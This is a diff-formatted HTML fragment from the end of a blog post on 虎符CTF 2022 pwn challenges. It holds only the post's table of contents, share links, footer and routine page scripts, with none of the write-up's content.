+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#babygame"><span class="toc-number">1.</span> <span class="toc-text">babygame</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mva"><span class="toc-number">2.</span> <span class="toc-text">mva</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gogogo"><span class="toc-number">3.</span> <span class="toc-text">gogogo</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4-1"><span class="toc-number">3.1.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-1"><span class="toc-number">3.2.</span> <span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">3.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#vdq"><span class="toc-number">4.</span> <span class="toc-text">vdq</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4-2"><span class="toc-number">4.1.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-2"><span class="toc-number">4.2.</span> <span class="toc-text">逆向分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Add"><span class="toc-number">4.2.0.0.1.</span> <span class="toc-text">Add</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Remove"><span class="toc-number">4.2.0.0.2.</span> <span class="toc-text">Remove</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Append"><span class="toc-number">4.2.0.0.3.</span> <span class="toc-text">Append</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Archive"><span class="toc-number">4.2.0.0.4.</span> <span class="toc-text">Archive</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#View"><span class="toc-number">4.2.0.0.5.</span> <span class="toc-text">View</span></a></li></ol></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;text=虎符CTF 2022 pwn"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;title=虎符CTF 2022 pwn"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;is_video=false&amp;description=虎符CTF 2022 pwn"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=虎符CTF 2022 pwn&amp;body=Check out this article: http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;title=虎符CTF 2022 pwn"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;title=虎符CTF 2022 pwn"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;title=虎符CTF 2022 pwn"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;title=虎符CTF 2022 pwn"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;name=虎符CTF 2022 pwn&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;t=虎符CTF 2022 pwn"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright ©
+    
+    
+    2021-2023
+    z1r0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
